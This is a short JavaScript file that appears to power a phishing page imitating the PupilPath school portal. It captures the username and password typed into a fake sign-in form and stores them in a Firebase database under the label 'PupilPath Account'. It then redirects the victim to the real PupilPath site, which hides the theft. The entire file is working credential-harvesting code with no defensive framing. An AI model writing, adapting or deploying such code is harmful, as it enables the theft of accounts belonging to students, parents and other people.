const username = document.getElementById("user_username")
const password = document.getElementById("user_password")
const signInButton = document.getElementById("sign_in")
const database = firebase.database().ref()
signInButton.addEventListener("click", saveInfo)

function saveInfo() {
    event.preventDefault()
    if(username.value == null || username.value == "" || password.value == null || password.value == ""){
        alert("Please Fill All Required Fields")
    }else{
    console.log(`Username ${username.value} \n Password ${password.value}`)
    database.push(`PupilPath Account: Username ${username.value} `+ `Password ${password.value}`)
    location.replace("https://pupilpath.skedula.com/")
    }
}
